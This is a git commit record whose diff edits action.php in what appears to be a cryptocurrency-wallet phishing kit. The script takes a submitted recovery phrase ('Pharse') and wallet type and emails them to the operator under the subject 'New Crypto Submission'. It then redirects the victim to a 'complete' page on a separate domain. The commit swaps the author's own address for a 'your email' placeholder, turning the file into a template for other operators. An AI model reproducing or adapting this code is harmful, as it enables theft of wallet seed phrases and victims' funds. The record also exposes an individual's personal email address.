ff1075e9a451d37a929ab64c2dff476612e336ec
Phoenixlord29 <geofferychidera29@gmail.com>
2025-01-25 21:17:50 +0100

    action.php

--- details/action.php
+++ details/action.php
@@ -15,7 +15,7 @@ $msg =  "Pharse: ".$a." \n Type: ".$b;
 $msg = wordwrap($msg,70);
 
 // send email
-mail("geofferychidera29@gmail.com","New Crypto Submission",$msg);
+mail("your email ","New Crypto Submission",$msg);
 
 header("Location: ://connectnowonline.online/complete");
 die();
